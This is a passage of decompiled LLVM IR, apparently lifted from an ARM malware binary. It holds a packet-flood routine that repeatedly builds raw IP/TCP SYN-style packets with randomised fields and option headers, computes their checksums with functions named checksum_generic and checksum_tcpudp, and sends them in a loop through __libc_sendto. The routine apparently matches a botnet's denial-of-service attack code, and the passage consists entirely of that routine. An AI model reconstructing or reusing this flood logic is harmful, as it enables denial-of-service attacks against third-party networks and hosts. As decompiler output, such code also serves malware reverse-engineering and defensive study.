  %v7_c3d0 = icmp eq i32 %v5_c3cc, -1
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c870, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3b0
  %v3_c3e0 = mul i32 %v7_c234, 65536
  store i32 %v3_c3e0, i32* %r0.global-to-local, align 4
  %v0_c3e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3e4 = mul i32 %v0_c3e4, 65536
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2f8, i32* %r2.global-to-local, align 4
  %v3_c3f4 = urem i32 %v7_c234, 65536
  store i32 %v3_c3f4, i32* %r3.global-to-local, align 4
  %v3_c3f8 = urem i32 %v0_c3e4, 65536
  %v3_c3fc = urem i32 %v0_c3e8, 65536
  store i32 %v3_c3fc, i32* %r1.global-to-local, align 4
  %v0_c400 = load i32, i32* @r7, align 4
  %v2_c400 = icmp eq i32 %v0_c400, 0
  store i1 %v2_c400, i1* %cpsr_z.global-to-local, align 1
  %v1_c410 = urem i32 %v6_c2f8, 256
  store i32 %v1_c410, i32* @fp, align 4
  br i1 %v2_c400, label %dec_label_pc_c664.preheader, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3d8
  %tmp52 = mul i32 %v5_c2c8, 256
  %v3_c430 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c234, 256
  %v3_c434 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c2c8, 256
  %v4_c43c = urem i32 %tmp54, 256
  %v5_c43c = or i32 %v4_c43c, %v3_c430
  store i32 %v5_c43c, i32* @lr, align 4
  %v1_c438 = mul i32 %v7_c234, 256
  %v4_c440 = and i32 %v1_c438, 65280
  %v5_c440 = or i32 %v4_c440, %v3_c434
  %tmp55 = mul i32 %v0_c3e4, 256
  %v3_c44c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3e8, 256
  %v3_c450 = and i32 %tmp56, 65280
  %v1_c454 = urem i32 %v6_c2f8, 2
  %v1_c458 = urem i32 %v6_c310, 2
  %tmp57 = udiv i32 %v0_c3e4, 256
  %v4_c45c = urem i32 %tmp57, 256
  %v5_c45c = or i32 %v4_c45c, %v3_c44c
  store i32 %v5_c45c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3e8, 256
  %v4_c460 = urem i32 %tmp58, 256
  %v5_c460 = or i32 %v4_c460, %v3_c450
  store i32 %v5_c460, i32* @r5, align 4
  %v1_c47c = urem i32 %v6_c328, 2
  store i32 %v1_c47c, i32* %r2.global-to-local, align 4
  %v1_c480 = urem i32 %v6_c340, 2
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = urem i32 %v6_c358, 2
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  %v1_c488 = urem i32 %v6_c370, 2
  store i32 %v1_c488, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c440, 65536
  %v4_c510 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c458
  %v4_c574 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c47c
  %v4_c588 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c480
  %v4_c5a0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c484
  %v3_c5b4 = and i32 %tmp64, 2
  %v1_c504 = trunc i32 %v6_c24c to i8
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %bb61, %dec_label_pc_c418
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  %v3_c4b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* @sb, align 4
  %v2_c4b8 = load i32, i32* @r4, align 4
  %v5_c4b8 = mul i32 %v2_c4b8, 4
  %v6_c4b8 = add i32 %v5_c4b8, %v1_c4b8
  %v7_c4b8 = inttoptr i32 %v6_c4b8 to i32*
  store i32 %v2_c4b0, i32* %v7_c4b8, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_c4bc = mul i32 %v0_c4bc, 32
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sb, align 4
  %v4_c4c0 = mul i32 %v0_c4bc, 4
  %v5_c4c0 = add i32 %v0_c4c0, %v4_c4c0
  %v6_c4c0 = inttoptr i32 %v5_c4c0 to i32*
  %v7_c4c0 = load i32, i32* %v6_c4c0, align 4
  store i32 %v7_c4c0, i32* %r4.global-to-local, align 4
  %v5_c4c4 = mul i32 %v0_c4bc, 24
  store i32 %v5_c4c4, i32* %r3.global-to-local, align 4
  %v1_c4c8 = load i32, i32* @r8, align 4
  %v2_c4c8 = add i32 %v1_c4c8, %v5_c4c4
  store i32 %v2_c4c8, i32* %r0.global-to-local, align 4
  %v1_c4cc = inttoptr i32 %v7_c4c0 to i8*
  %v2_c4cc = load i8, i8* %v1_c4cc, align 1
  %tmp65 = urem i8 %v2_c4cc, 16
  %v1_c4d0 = zext i8 %tmp65 to i32
  %v1_c4d4 = or i32 %v1_c4d0, 64
  store i32 %v1_c4d4, i32* %r3.global-to-local, align 4
  %v1_c4d8 = trunc i32 %v1_c4d4 to i8
  store i8 %v1_c4d8, i8* %v1_c4cc, align 1
  %v0_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4dc = inttoptr i32 %v0_c4dc to i8*
  %v2_c4dc = load i8, i8* %v1_c4dc, align 1
  %v1_c4e0 = and i8 %v2_c4dc, -16
  %v1_c4e4 = or i8 %v1_c4e0, 5
  store i32 %v1_c278, i32* %r3.global-to-local, align 4
  store i8 %v1_c4e4, i8* %v1_c4dc, align 1
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 1
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v5_c230, i8* %v4_c4f4, align 1
  store i32 %v1_c254, i32* %r2.global-to-local, align 4
  %v0_c4fc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4fc = icmp eq i32 %v0_c4fc, 0
  store i1 %v2_c4fc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c504 = load i32, i32* %r4.global-to-local, align 4
  %v3_c504 = add i32 %v2_c504, 8
  %v4_c504 = inttoptr i32 %v3_c504 to i8*
  store i8 %v1_c504, i8* %v4_c504, align 1
  %v0_c508 = load i32, i32* %r3.global-to-local, align 4
  %v1_c508 = trunc i32 %v0_c508 to i16
  %v2_c508 = load i32, i32* %r4.global-to-local, align 4
  %v3_c508 = add i32 %v2_c508, 2
  %v4_c508 = inttoptr i32 %v3_c508 to i16*
  store i16 %v1_c508, i16* %v4_c508, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c514, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c4a8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c4a8, %bb
  %v2_c518 = load i32, i32* %r4.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 9
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 6, i8* %v4_c518, align 1
  %v0_c51c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c51c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c51c = load i32, i32* %r2.global-to-local, align 4
  %v2_c51c = trunc i32 %v1_c51c to i16
  %v3_c51c = load i32, i32* %r4.global-to-local, align 4
  %v4_c51c = add i32 %v3_c51c, 6
  %v5_c51c = inttoptr i32 %v4_c51c to i16*
  store i16 %v2_c51c, i16* %v5_c51c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c38c, i32* %r2.global-to-local, align 4
  %v1_c524 = load i32, i32* %r4.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 12
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v6_c38c, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 16
  %v2_c528 = inttoptr i32 %v1_c528 to i32*
  %v3_c528 = load i32, i32* %v2_c528, align 4
  store i32 %v3_c528, i32* %r3.global-to-local, align 4
  %v0_c52c = load i32, i32* %r1.global-to-local, align 4
  %v1_c52c = trunc i32 %v0_c52c to i16
  %v2_c52c = load i32, i32* %r4.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 4
  %v4_c52c = inttoptr i32 %v3_c52c to i16*
  store i16 %v1_c52c, i16* %v4_c52c, align 2
  %v0_c530 = load i32, i32* %r3.global-to-local, align 4
  %v1_c530 = load i32, i32* %r4.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 16
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* @r6, align 4
  %v1_c534 = trunc i32 %v0_c534 to i16
  %v2_c534 = load i32, i32* %r4.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 20
  %v4_c534 = inttoptr i32 %v3_c534 to i16*
  store i16 %v1_c534, i16* %v4_c534, align 2
  %v0_c538 = load i32, i32* %r4.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538, 20
  store i32 %v1_c538, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c538, 32
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v4_c53c, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c538, 33
  %v2_c540 = inttoptr i32 %v1_c540 to i8*
  %v3_c540 = load i8, i8* %v2_c540, align 1
  %v4_c540 = zext i8 %v3_c540 to i32
  store i32 %v1_c454, i32* %r0.global-to-local, align 4
  %v1_c548 = urem i8 %v3_c53c, 16
  %v1_c54c = or i8 %v1_c548, -96
  %v1_c550 = and i32 %v4_c540, 223
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_c558 = load i32, i32* %r0.global-to-local, align 4
  %v4_c558 = mul i32 %v1_c558, 32
  %v5_c558 = or i32 %v4_c558, %v0_c558
  store i32 %v5_c558, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v5_c558 to i8
  %v2_c560 = load i32, i32* %r1.global-to-local, align 4
  %v3_c560 = add i32 %v2_c560, 13
  %v4_c560 = inttoptr i32 %v3_c560 to i8*
  store i8 %v1_c560, i8* %v4_c560, align 1
  %v0_c564 = load i32, i32* %r3.global-to-local, align 4
  %v1_c564 = load i32, i32* %r1.global-to-local, align 4
  %v2_c564 = add i32 %v1_c564, 4
  %v3_c564 = inttoptr i32 %v2_c564 to i32*
  store i32 %v0_c564, i32* %v3_c564, align 4
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c458, i32* %r0.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r3.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c47c, i32* %r3.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r2.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  %v1_c58c = trunc i32 %v0_c58c to i16
  %v3_c58c = add i32 %v0_c57c, 2
  %v4_c58c = inttoptr i32 %v3_c58c to i16*
  store i16 %v1_c58c, i16* %v4_c58c, align 2
  %v0_c590 = load i32, i32* %r2.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 13
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_c594 = add i32 %v0_c594, 13
  %v2_c594 = inttoptr i32 %v1_c594 to i8*
  %v3_c594 = load i8, i8* %v2_c594, align 1
  %v4_c594 = zext i8 %v3_c594 to i32
  store i32 %v1_c480, i32* %r0.global-to-local, align 4
  %v1_c59c = and i32 %v4_c594, 251
  %v5_c5a0 = or i32 %v1_c59c, %v4_c5a0
  store i32 %v5_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = trunc i32 %v5_c5a0 to i8
  store i8 %v1_c5a4, i8* %v2_c594, align 1
  %v0_c5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5a8 = add i32 %v0_c5a8, 13
  %v2_c5a8 = inttoptr i32 %v1_c5a8 to i8*
  %v3_c5a8 = load i8, i8* %v2_c5a8, align 1
  %v4_c5a8 = zext i8 %v3_c5a8 to i32
  store i32 %v1_c484, i32* %r3.global-to-local, align 4
  %v1_c5b0 = and i32 %v4_c5a8, 253
  %v4_c5b4 = or i32 %v1_c5b0, %v3_c5b4
  store i32 %v4_c5b4, i32* %r2.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v4_c5b4 to i8
  store i8 %v1_c5b8, i8* %v2_c5a8, align 1
  %v0_c5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5bc, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c488, i32* %r0.global-to-local, align 4
  %v1_c5c4 = and i32 %v4_c5bc, 254
  %v2_c5c8 = or i32 %v1_c5c4, %v1_c488
  store i32 %v2_c5c8, i32* %r3.global-to-local, align 4
  %v1_c5cc = trunc i32 %v2_c5c8 to i8
  store i8 %v1_c5cc, i8* %v2_c5bc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 40
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 2, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 41
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = call i32 @rand_next()
  %v1_c5e4 = urem i32 %v0_c5e0, 16
  %v1_c5e8 = or i32 %v1_c5e4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5e8, 256
  %v3_c5f4 = add nuw nsw i32 %tmp66, 2048
  %v5_c5fc = or i32 %v3_c5f4, 5
  %v1_c600 = trunc i32 %v5_c5fc to i16
  %v2_c600 = load i32, i32* %r4.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 42
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 44
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 4, i8* %v4_c608, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c618 = load i32, i32* %r4.global-to-local, align 4
  %v3_c618 = add i32 %v2_c618, 46
  %v4_c618 = inttoptr i32 %v3_c618 to i8*
  store i8 8, i8* %v4_c618, align 1
  %v0_c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* %r4.global-to-local, align 4
  %v3_c61c = add i32 %v2_c61c, 47
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = load i32, i32* %r0.global-to-local, align 4
  %v1_c620 = trunc i32 %v0_c620 to i8
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 45
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v1_c620, i8* %v4_c620, align 1
  %v0_c624 = call i32 @rand_next()
  store i32 %v0_c624, i32* %r0.global-to-local, align 4
  %v2_c62c = load i32, i32* %r4.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 59
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 6, i8* %v4_c62c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* %r4.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 48
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c624, i32* %v3_c63c, align 4
  %v0_c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_c640 = load i32, i32* %r4.global-to-local, align 4
  %v2_c640 = add i32 %v1_c640, 52
  %v3_c640 = inttoptr i32 %v2_c640 to i32*
  store i32 %v0_c640, i32* %v3_c640, align 4
  %v0_c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* %r4.global-to-local, align 4
  %v3_c644 = add i32 %v2_c644, 56
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v0_c648 = load i32, i32* %r1.global-to-local, align 4
  %v1_c648 = trunc i32 %v0_c648 to i8
  %v2_c648 = load i32, i32* %r4.global-to-local, align 4
  %v3_c648 = add i32 %v2_c648, 58
  %v4_c648 = inttoptr i32 %v3_c648 to i8*
  store i8 %v1_c648, i8* %v4_c648, align 1
  %v0_c64c = load i32, i32* %r1.global-to-local, align 4
  %v1_c64c = trunc i32 %v0_c64c to i8
  %v2_c64c = load i32, i32* %r4.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 57
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 %v1_c64c, i8* %v4_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = load i32, i32* %r2.global-to-local, align 4
  %v2_c654 = add i32 %v1_c654, %v3_c650
  store i32 %v2_c654, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r7, align 4
  %v9_c658 = icmp eq i32 %v2_c654, %v1_c658
  store i1 %v9_c658, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c654, i32* %stack_var_-44, align 4
  %v5_c660 = icmp slt i32 %v2_c654, %v1_c658
  br i1 %v5_c660, label %dec_label_pc_c4a8, label %dec_label_pc_c664.preheader

dec_label_pc_c664.preheader:                      ; preds = %bb61, %dec_label_pc_c3d8
  %v0_c6686 = phi i32 [ 0, %dec_label_pc_c3d8 ], [ %v1_c658, %bb61 ]
  %v3_c7e0 = icmp eq i32 %v6_c38c, -1
  %v8_c7e0 = icmp eq i32 %v6_c38c, -1
  %v3_c6b0 = icmp eq i32 %v3_c3f4, 65535
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774, %dec_label_pc_c664.preheader
  %v0_c668 = phi i32 [ %v0_c6686, %dec_label_pc_c664.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c664 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c668 = icmp eq i32 %v0_c668, 0
  store i1 %v2_c668, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c668, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c6f0, %dec_label_pc_c674
  %v1_c688 = phi i32 [ %v1_c764, %dec_label_pc_c6f0 ], [ 0, %dec_label_pc_c674 ]
  %v5_c67c = mul i32 %v1_c688, 24
  %v1_c680 = load i32, i32* @r8, align 4
  %v2_c680 = add i32 %v1_c680, %v5_c67c
  store i32 %v2_c680, i32* %r3.global-to-local, align 4
  %v1_c684 = add i32 %v2_c680, 20
  %v2_c684 = inttoptr i32 %v1_c684 to i8*
  %v3_c684 = load i8, i8* %v2_c684, align 1
  %v4_c684 = zext i8 %v3_c684 to i32
  store i32 %v4_c684, i32* %r2.global-to-local, align 4
  %v0_c688 = load i32, i32* @sb, align 4
  %v4_c688 = mul i32 %v1_c688, 4
  %v5_c688 = add i32 %v0_c688, %v4_c688
  %v6_c688 = inttoptr i32 %v5_c688 to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* @r5, align 4
  %v7_c68c = icmp eq i8 %v3_c684, 31
  store i1 %v7_c68c, i1* %cpsr_z.global-to-local, align 1
  %v1_c690 = add i32 %v7_c688, 20
  store i32 %v1_c690, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c684, 32
  br i1 %tmp67, label %dec_label_pc_c788, label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c678
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6b0, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v1_c6bc = phi i32 [ %v1_c7f8, %dec_label_pc_c7e8 ], [ 65535, %dec_label_pc_c6a4 ]
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v9_c6bc = icmp eq i32 %v3_c3f8, %v1_c6bc
  store i1 %v9_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6bc, label %dec_label_pc_c818, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge ], [ %v1_c6bc, %dec_label_pc_c6b8 ]
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c3fc, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c82c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c6d4.pre, %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v5_c2c8, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c840, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge, %dec_label_pc_c6d0
  %v1_c6e0 = phi i32 [ %v1_c6e0.pre, %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge ], [ %v1_c6d4, %dec_label_pc_c6d0 ]
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v9_c6e0 = icmp eq i32 %v6_c2e0, %v1_c6e0
  store i1 %v9_c6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6e0, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c6e8 = load i32, i32* @fp, align 4
  %v2_c6e8 = icmp eq i32 %v0_c6e8, 0
  store i1 %v2_c6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854, %dec_label_pc_c864
  %v2_c6f4 = load i32, i32* @r5, align 4
  %v3_c6f4 = add i32 %v2_c6f4, 10
  %v4_c6f4 = inttoptr i32 %v3_c6f4 to i16*
  store i16 0, i16* %v4_c6f4, align 2
  %v0_c6f8 = load i32, i32* @r5, align 4
  store i32 %v0_c6f8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c700 = call i32 @checksum_generic(i32 %v0_c6f8, i32 20)
  %v3_c700 = trunc i32 %v2_c700 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c708 = load i32, i32* @r5, align 4
  %v4_c708 = add i32 %v3_c708, 10
  %v5_c708 = inttoptr i32 %v4_c708 to i16*
  store i16 %v3_c700, i16* %v5_c708, align 2
  %v0_c70c = load i32, i32* @r6, align 4
  store i32 %v0_c70c, i32* @r1, align 4
  %v0_c710 = load i32, i32* %r2.global-to-local, align 4
  %v1_c710 = trunc i32 %v0_c710 to i16
  %v3_c710 = add i32 %v0_c70c, 16
  %v4_c710 = inttoptr i32 %v3_c710 to i16*
  store i16 %v1_c710, i16* %v4_c710, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v4_c720 = call i32 @checksum_tcpudp(i32 %v0_c71c, i32 %v0_c70c, i32 10240, i32 40)
  %v5_c720 = trunc i32 %v4_c720 to i16
  store i32 %v4_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c724, i32* %r3.global-to-local, align 4
  %v3_c728 = mul i32 %v3_c724, 32
  store i32 %v3_c728, i32* %lr.global-to-local, align 4
  %v3_c72c = load i32, i32* @r6, align 4
  %v4_c72c = add i32 %v3_c72c, 16
  %v5_c72c = inttoptr i32 %v4_c72c to i16*
  store i16 %v5_c720, i16* %v5_c72c, align 2
  %v0_c730 = load i32, i32* %lr.global-to-local, align 4
  %v1_c730 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c730, -8
  %v5_c730 = add i32 %v0_c730, %tmp68
  store i32 %v5_c730, i32* %lr.global-to-local, align 4
  %v0_c734 = load i32, i32* @r6, align 4
  %v1_c734 = add i32 %v0_c734, 2
  %v2_c734 = inttoptr i32 %v1_c734 to i16*
  %v3_c734 = load i16, i16* %v2_c734, align 2
  %v4_c734 = zext i16 %v3_c734 to i32
  store i32 %v4_c734, i32* @r6, align 4
  %v1_c738 = load i32, i32* @r8, align 4
  %v2_c738 = add i32 %v1_c738, %v5_c730
  store i32 %v2_c738, i32* @lr, align 4
  %v3_c73c = add i32 %v2_c738, 2
  %v4_c73c = inttoptr i32 %v3_c73c to i16*
  store i16 %v3_c734, i16* %v4_c73c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @lr, align 4
  %v6_c75c = call i32 @__libc_sendto(i32 %v0_c74c, i32 %v0_c748, i32 60, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v1_c768 = load i32, i32* @r7, align 4
